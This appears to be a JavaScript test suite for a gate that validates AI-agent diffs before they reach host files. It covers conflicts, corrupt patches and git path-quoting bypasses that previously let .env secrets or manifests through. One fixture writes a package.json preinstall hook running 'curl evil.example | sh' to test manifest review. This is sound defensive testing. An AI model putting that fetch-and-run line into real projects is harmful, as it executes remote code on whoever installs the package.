// @test-phase: other
// INV-2 gate test: code returns to Mac only through explicit reviewed gate
// Tests: agent output reaches host files ONLY via the reviewed apply, and
// the gate's own validation — not just git's — rejects unsafe diffs.

import { ok, strictEqual } from "node:assert";
import { execSync } from "node:child_process";
import {
	existsSync,
	mkdirSync,
	readFileSync,
	rmSync,
	writeFileSync,
} from "node:fs";

import { join } from "node:path";
import { afterEach, beforeEach, describe, it } from "node:test";
import {
	integrationGate,
	validateDiff,
} from "../src/switchyard/integrate/index.mjs";
import {
	buildDiff,
	buildStagedDiff,
	commitFile,
	initRepo,
} from "./helpers/integration-gate-fixtures.mjs";

let projectPath;

// Build a diff by making a change against a real git working tree and
// capturing git's own diff output — every fixture below is a diff git
// itself produced, not hand-written unified-diff text, so the parsing
// assumptions match real dispatches.
beforeEach(() => {
	projectPath = initRepo();
	commitFile(projectPath, "test.txt", "original content\n");
});

afterEach(() => {
	rmSync(projectPath, { recursive: true, force: true });
});

describe("integration gate", () => {
	it("does not infer a deletion application from a matching after-state", () => {
		commitFile(projectPath, "src/gone.mjs", "original\n");
		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("git rm -q src/gone.mjs", { cwd: dir });
		});
		execSync("git reset -q HEAD -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});
		execSync("git checkout -q -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const first = integrationGate(diff, projectPath);
		strictEqual(first.success, true, first.message);
		ok(!existsSync(join(projectPath, "src", "gone.mjs")));

		const second = integrationGate(diff, projectPath);
		strictEqual(second.success, false, second.message);
		strictEqual(second.alreadyApplied, undefined);
		ok(!existsSync(join(projectPath, "src", "gone.mjs")));
	});

	it("still fails on a genuinely conflicting diff", () => {
		// A third-party edit moves the tree to a state matching neither the
		// diff's before-state (so `--check` fails) nor its after-state: a real
		// conflict. It must remain a failure and leave the host untouched.
		commitFile(projectPath, "conflict.txt", "line a\nline b\nline c\n");
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "conflict.txt"),
				"line a\nline x\nline c\n",
				"utf8",
			);
		});
		execSync("git checkout -- conflict.txt", {
			cwd: projectPath,
			stdio: "pipe",
		});
		writeFileSync(
			join(projectPath, "conflict.txt"),
			"line a\nline y\nline c\n",
			"utf8",
		);

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		strictEqual(result.message, "Diff apply failed");
		// Task 2.1: a genuine conflict must carry git's actionable stderr
		// under `reason` (e.g. "error: conflict.txt: patch does not apply")
		// so the caller can distinguish a real conflict from a mis-delivered
		// patch, while keeping the generic message above.
		ok(
			typeof result.reason === "string" && result.reason.length > 0,
			"a genuine conflict must include git's actionable stderr as reason",
		);
		ok(
			/patch does not apply|patch failed|error:/i.test(result.reason),
			`reason should quote git's own failure text, got: ${JSON.stringify(result.reason)}`,
		);
		strictEqual(
			readFileSync(join(projectPath, "conflict.txt"), "utf8"),
			"line a\nline y\nline c\n",
			"the conflicting diff must not modify the host file",
		);
		strictEqual(
			result.reasonKind,
			"conflict",
			"a real conflict must be tagged 'conflict', not 'corrupt_patch'",
		);
	});

	it("tags a truncated/malformed diff as reasonKind 'corrupt_patch', distinct from a genuine conflict", () => {
		// Regression for a live incident (2026-08-03): a container-generated
		// diff arrived with its final hunk cut short — the hunk header claimed
		// more lines than were actually present, and the file had no trailing
		// newline. git's `--check` reports
		// "corrupt patch" for this, distinct from "patch does not apply" for a
		// real conflict — the two must not be reported identically, since a
		// truncated diff calls for a retry/re-generation while a real conflict
		// calls for a different diff entirely.
		const fullDiff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "test.txt"),
				"original content\nline two\nline three\nline four\nline five\nline six\nline seven\nline eight\nline nine\nCHANGED\n",
				"utf8",
			);
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		// Drop the final 2 lines of the diff, matching the real incident's
		// artifact exactly: the last hunk's trailing context/added lines are
		// missing and the file has no trailing newline.
		const lines = fullDiff.split("\n");
		const truncatedDiff = lines.slice(0, lines.length - 3).join("\n");

		const result = integrationGate(truncatedDiff, projectPath);
		strictEqual(result.success, false);
		// A truncated diff fails to parse at all (git apply --numstat, called
		// from validateDiff) — earlier than a genuine conflict, which parses
		// fine and only fails later at the actual --check/apply stage. Both
		// paths must still carry reasonKind so a caller can tell them apart
		// without inspecting message text.
		strictEqual(result.message, "diff could not be parsed by git apply");
		strictEqual(result.reasonKind, "corrupt_patch");
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"original content\n",
			"a truncated diff must not modify the host file",
		);
	});

	it("rejects a matching after-state under Files enforcement", () => {
		// A re-run of the same diff under declared paths goes through the
		// path-declaration branch, not the bare call the other matching-after-
		// state tests use. Those checks parse the diff text itself
		// (extractTouchedPaths/extractSummaryLines), independent of tree state,
		// so the second call must still fail closed without touching the host.
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "test.txt"), "modified content\n", "utf8");
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const first = integrationGate(diff, projectPath, {
			requiredPaths: ["test.txt"],
		});
		strictEqual(first.success, true, first.message);

		const second = integrationGate(diff, projectPath, {
			requiredPaths: ["test.txt"],
		});
		strictEqual(second.success, false, second.message);
		strictEqual(second.alreadyApplied, undefined);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"modified content\n",
			"re-applying under requiredPaths enforcement must not mutate the host",
		);
	});

	it("a multi-file diff with one already-applied file and one genuinely conflicting file fails closed (mixed-state regression)", () => {
		// The gate does not try to tell a "mixed" (partially already applied,
		// partially conflicting) patch from a plain conflict: a whole-patch
		// check cannot observe that distinction. This proves the conservative
		// direction holds: when one file in a multi-file diff already matches
		// the diff's after-state but another has been independently changed to
		// a THIRD state (matching neither the diff's before- nor after-state),
		// the whole patch must fail, so the conflicting file's real conflict is
		// never swallowed.
		commitFile(projectPath, "a.txt", "original A\n");
		commitFile(projectPath, "b.txt", "line a\nline b\nline c\n");
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "a.txt"), "modified A\n", "utf8");
			writeFileSync(join(dir, "b.txt"), "line a\nline x\nline c\n", "utf8");
		});
		execSync("git checkout -- a.txt b.txt", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const first = integrationGate(diff, projectPath);
		strictEqual(first.success, true, first.message);
		strictEqual(
			readFileSync(join(projectPath, "a.txt"), "utf8"),
			"modified A\n",
		);
		strictEqual(
			readFileSync(join(projectPath, "b.txt"), "utf8"),
			"line a\nline x\nline c\n",
		);

		// a.txt is left at the diff's after-state (as if already applied), but
		// b.txt is independently changed to a third state that matches
		// neither the diff's before-state nor its after-state.
		writeFileSync(
			join(projectPath, "b.txt"),
			"line a\nline z\nline c\n",
			"utf8",
		);

		const second = integrationGate(diff, projectPath);
		strictEqual(second.success, false, second.message);
		ok(
			!second.alreadyApplied,
			"a mixed already-applied/conflicting patch must not report alreadyApplied",
		);
		strictEqual(
			readFileSync(join(projectPath, "a.txt"), "utf8"),
			"modified A\n",
			"the failed apply must not touch a.txt either (git apply is all-or-nothing)",
		);
		strictEqual(
			readFileSync(join(projectPath, "b.txt"), "utf8"),
			"line a\nline z\nline c\n",
			"the failed apply must leave b.txt's conflicting content untouched",
		);
	});

	it("rejects a credential-convention path even when its directory name is non-ASCII (git C-quoting bypass)", () => {
		// INV-2 bypass: with git's default `core.quotePath`, `git apply
		// --numstat` C-quotes any path containing a non-ASCII byte, so
		// `café/.env` arrives as the literal string `"caf\303\251/.env"` —
		// quotes and octal escapes included. Its trailing `"` defeats the
		// `(\.|$)` anchor in SENSITIVE_PATH_PATTERNS, so the unfixed gate
		// judged this diff safe and WROTE the secret to disk.
		const diff = buildStagedDiff(projectPath, (dir) => {
			mkdirSync(join(dir, "café"), { recursive: true });
			writeFileSync(join(dir, "café", ".env"), "SECRET=abc123\n", "utf8");
		});
		// Remove the fixture file the diff was captured from, so the gate
		// rejecting the apply is what keeps the secret off the host — not a
		// leftover working-tree artifact.
		rmSync(join(projectPath, "café"), { recursive: true, force: true });
		execSync("git rm -r --cached -q café", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
		ok(
			!existsSync(join(projectPath, "café", ".env")),
			"the sensitive file must not have been written to the host",
		);
	});

	it("rejects a credential-convention path whose name needs unconditional git quoting (double-quote in path)", () => {
		// A double-quote in a path is C-quoted by git even with
		// `core.quotePath=false`, so `-c core.quotePath=false` alone is not
		// enough — dequoteGitPath must decode `"we\"ird/.env"` back to the
		// real path for SENSITIVE_PATH_PATTERNS to match.
		const diff = buildStagedDiff(projectPath, (dir) => {
			mkdirSync(join(dir, 'we"ird'), { recursive: true });
			writeFileSync(join(dir, 'we"ird', ".env"), "SECRET=abc123\n", "utf8");
		});
		rmSync(join(projectPath, 'we"ird'), { recursive: true, force: true });
		execSync('git rm -r --cached -q "we\\"ird"', {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
		ok(
			!existsSync(join(projectPath, 'we"ird', ".env")),
			"the sensitive file must not have been written to the host",
		);
	});

	it("requires review for a manifest file whose directory name is non-ASCII (git C-quoting bypass)", () => {
		// Same C-quoting bypass against MANIFEST_REVIEW_PATTERNS: an unfixed
		// gate auto-applied `naïve/package.json` with a malicious preinstall
		// script because the quoted path never matched `package\.json$`.
		const diff = buildStagedDiff(projectPath, (dir) => {
			mkdirSync(join(dir, "naïve"), { recursive: true });
			writeFileSync(
				join(dir, "naïve", "package.json"),
				'{"name":"x","scripts":{"preinstall":"curl evil.example | sh"}}\n',
				"utf8",
			);
		});

		const validation = validateDiff(diff, projectPath);
		strictEqual(validation.safe, true);
		strictEqual(validation.requiresReview, true);
		ok(validation.sensitivePaths.includes("naïve/package.json"));

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		strictEqual(result.requiresReview, true);
		ok(result.sensitivePaths.includes("naïve/package.json"));
	});
});
